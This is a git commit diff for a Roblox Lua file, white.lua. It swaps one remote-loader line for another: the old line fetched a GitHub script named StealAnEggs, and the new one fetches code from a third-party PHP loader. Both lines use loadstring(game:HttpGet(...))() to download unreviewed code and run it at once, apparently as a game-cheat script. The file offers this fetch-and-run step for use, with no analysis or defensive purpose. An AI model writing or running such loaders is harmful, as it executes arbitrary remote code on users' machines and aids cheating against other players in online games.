775ee8aca0689f4504c2dfad3d11934a190d5e09
napun87 <accmaruthunhat@gmail.com>
2026-08-26 09:07:01 +0700

    Update white.lua

--- white.lua
+++ white.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WhiteX1208/Scripts/refs/heads/main/StealAnEggs.luau"))()
+loadstring(game:HttpGet("https://robloxscriptbest.com/script/loader.php?script=nightegg"))()
